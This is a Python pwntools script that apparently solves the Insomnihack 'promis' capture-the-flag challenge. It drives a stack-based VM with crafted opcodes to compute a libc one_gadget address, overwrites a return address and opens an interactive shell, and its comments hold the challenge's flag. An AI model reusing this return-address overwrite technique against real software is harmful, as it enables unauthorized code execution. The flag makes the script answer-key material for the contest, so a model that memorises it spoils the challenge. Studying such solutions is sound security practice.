#!/usr/bin/env python3
import struct

from pwn import *
def connect():
    if args.LOCAL:
        return gdb.debug(["./promis-b06f02c72ba33b9366cb8f4242dff0a28c074145b5e0e9942725e1826f957d0e.dbg"], api=True)
    else:
        return remote("promis.insomnihack.ch", 6666)
CLEAR = b"\x28"
DUP = b"\x36"
PUSH_INT = b"\x08"
SET_TOP_INT = b"\x56"
ADD = b"\x20"
def main():
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.execute("handle 14 nopass")
            # tube.gdb.execute("b *&clear")
            # tube.gdb.execute("b *&set_top_int")
            # tube.gdb.execute("b *&add")
            tube.gdb.continue_nowait()
        tube.sendafter(b"Please enter your choice:", b"1 111")
        # [+11] cookie
        # [+12] rbp
        # [+13] main+139
        # [+17] __libc_start_main+231
        # 0000000000021ba0 T __libc_start_main@@GLIBC_2.2.5
        one_off = 0x4f29e - (0x21ba0 + 231)
        tube.sendline(b''.join((
            # Position just below __libc_start_main+231.
            CLEAR,
            DUP * 2,
            CLEAR,
            SET_TOP_INT + struct.pack("<I", one_off),
            # Generate one_gadget address.
            ADD,
            # Propagate it to main+139.
            DUP * 5,
        )))
        # INS{Why_ar3_1her3_b@ckd0or_3ve4ywhere}
        tube.interactive()
if __name__ == "__main__":
    main()
